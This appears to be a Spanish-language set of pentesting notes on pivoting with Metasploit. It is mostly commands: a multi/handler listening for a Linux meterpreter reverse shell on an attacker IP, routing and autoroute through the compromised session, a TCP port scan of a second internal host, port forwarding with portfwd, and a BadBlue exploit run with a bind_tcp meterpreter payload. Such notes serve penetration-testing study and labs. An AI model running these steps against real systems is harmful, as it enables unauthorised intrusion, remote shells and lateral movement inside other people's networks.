# Pivoting con Metasploit

Tags: #Pivoting #Metasploit #PortForwarding 

```bash 
1. # Usaremos el Multihandler para tener una sesion con Meterpreter y hacer Port Porwarding (Linux - Linux)
❯ msfconsole -q                     # q = Quitar el banner de inicio

	❯ use multi/handler            # Así nos pondremos en escucha en nuestra maquina de atacante              
	❯ options
	❯ set LHOST 192.168.68.1       # IP de la maquina de atacante                 
	❯ set LPORT 433                # Puerto de escucha en la maquina de atacante 
	❯ set payload linux/x86/meterpreter/reverse_tcp
	❯ run
```

```bash 
2. Buscaremos la manera de enviarnos una Revershell a nuestra maquina de atacante desde la maquina victima 
```

```bash 
3. # Despues de tener la sesión, hacemos lo siguiente con los comandos de Meterpreter
meterpreter❯

	❯ ipconfig             # Para ver todas las IP en la maquina victima 
	❯ Ctrl + z             # Para pasar la sesion a segundo plano


4. # Nos salimos de la sesion de Meterpreter
❯ sessions                   # Mirar los ID de las sessiones que tenemos activas 
# Redireccionaremos todo el trafico de una interfaz a nuestra maquina de atacante en Metasploit  
❯ route add <IP> <Mask> <ID>
	# IP = Colocamos la direccion IP de la interfaz a la que no llegamos 
	# Mask = Colocamos la mascara de red de esa IP (255.255.255.0)
	# ID = Colocamos el ID de la sesion que esta en segundo plano 
```

```bash 
5. # Ahora haremos el Port Forwarding (Traernos un puerto especifico a nuestra maquina de atacante) en Metasploit
❯ sessions -l                  # Listas las sesiones activas 'l = ele'
❯ sessions -i <ID>             # Retomas la sesion activa 'ID = Identificador de la sesion' 


# Regresamos a la sesion de Meterpreter y hacemos el 'Port Forwarding'
meterpreter❯ portfwd add -l <PORT_Atacante> -p <PORT_Victima> -r <IP_Victima>
	# l = ele
	# Port_Atacante = Puerto que vamos a abrir de nuestra maquina de atacante 
	# IP = Colocamos la IP de la maquina victima 
	# PORT_Victima = Puerto que nos vamos a traer de la maquina victima 


6. # En nuestro navegador web podemos visualizar el puerto que nos hemos traido, esto si ha sido un puerto web (80)
127.0.0.1:<PORT>
	# PORT = Es el puerto que hemos puesto en el comando anterior que ibamos a abrir de nuestra maquina de atacante 

# Si es un puerto FTP el que nos traemos de la maquina victima, hacemos lo siguiente 
❯ ftp 127.0.0.1 -p <PORT>
	# PORT = Es el puerto que hemos puesto en el comando anterior que ibamos a abrir de nuestra maquina de atacante 
```

## Segunda forma (Traer puertos individuales de la maquina victima)

```bash 
# Comandos con Meterpreter 

❯ run autoroute -s 10.0.20.0/20             # Agregamos la ruta entera 
❯ run autoroute -p                          # Muestra la tabla de ruteo actual 
❯ background 
	❯ search portscan                      # Usaremos el modulo para el escaneo de puerto TCP (Maquina victima 2)
	❯ use auxiliary/scanner/portscan/tcp
	❯ options 
	❯ set RHOSTS 10.0.20.96           # Colocamos la IP de la maquina victima 2 (La que acabamos de agregar a la tabla de ruteo)
	❯ set PORTS 1-100                 # Rango de puertos a escanear 
	❯ exploit 

❯ sessions <ID>                        # Regresamos a la sesion actual de Meterpreter 


# Ahora haremos el PortForwarding con Meterpreter
❯ portfwd add -l 1234 -p 80 -r <IP>
	# l = Puerto local (Maquina de atacante)
	# p = Puerto remoto (Maquina victima) que nos vamos a traer 
	# r = Activar el PortForwarding en el sistema remoto 
	# IP = Direccion IP de la maquina victima 2 


# Veriricando que nuestro 'localhost' tiene ese puerto activado de la maquina victima 2, ahora buscamos el exploit
❯ backgroung                   # Colocamos la sesion de Meterpreter en segundo plano 
	❯ search Badblue
	❯ use exploit/windows/http/badblue_passthru
	❯ options 
	❯ set payload windows/meterpreter/bind_tcp
	❯ set RHOSTS <IP>         # Colocamos la IP de la maquina victima 2 
	❯ exploit 
```